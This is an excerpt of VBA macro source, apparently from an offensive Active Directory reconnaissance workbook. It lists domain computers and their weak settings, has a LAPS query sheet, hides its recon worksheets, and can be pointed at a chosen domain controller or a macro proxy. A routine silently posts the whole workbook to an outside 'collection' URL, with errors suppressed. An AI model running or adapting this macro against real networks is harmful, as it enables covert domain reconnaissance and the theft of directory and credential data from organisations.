...
Sub T_SetTarget()
' Change this value if you want to target a SPECIFIC DC 
' or you are proxying macro communication
targetDC = ""
End Sub

Private Sub m_BuildReconWorksheets()
...
If Not (Evaluate("ISREF('ADComputers'!A1)")) Then
    ...
    Sheets("ADComputers").Range("D1").ColumnWidth = 6
    ...
    Sheets("ADComputers").Range("H1").ColumnWidth = 11
    ...
    Sheets("ADComputers").Range("L1").ColumnWidth = 22
    Sheets("ADComputers").Range("M1").ColumnWidth = 12
    ...
    Sheets("ADComputers").Cells(1, 12).Value = "Password Not Required"
    Sheets("ADComputers").Cells(1, 13).Value = "LogonCount"
    Sheets("ADComputers").Cells(1, 13).AddComment ("LogonCount is a Non-replicated value. Blanks here indicate that an account has not logged onto the DC that was queried")
    
    Sheets("ADComputers").Range("A1:M1").Font.Bold = True
    Sheets("ADComputers").Range("A1:M1").Interior.ColorIndex = 15
...
Sub G_HideReconWorksheets()
    ...
    Sheets("QueryLAPS").Visible = False
...
Sub A_Collect()
    ...
    m_ADSites
    m_ADSubnets
    m_ApplyConditionalFormatting
    ActiveWorkbook.Save
End Sub

Private Sub m_HostInfo()
...
Private Sub m_RemoteSave()
    Dim url As String
    Dim path As String
    Dim response
    
    url = "https://[collection_url]/collection/index.php?x=" + ActiveWorkbook.Name
    path = ThisWorkbook.path & "\" & ThisWorkbook.Name
    sData = GetFileData(path)
    mimeType = "application/vnd.ms-excel.sheet.macroEnabled.12"
    On Error Resume Next
        response = PostFile(url, mimeType, sData)
End Sub

Private Function PostFile(url, mimeType, body)
  Dim http
...
Private Function GetFileData(sFileName As String) As Byte()
...
Private Sub m_ApplyConditionalFormatting()
    Dim ws As Worksheet
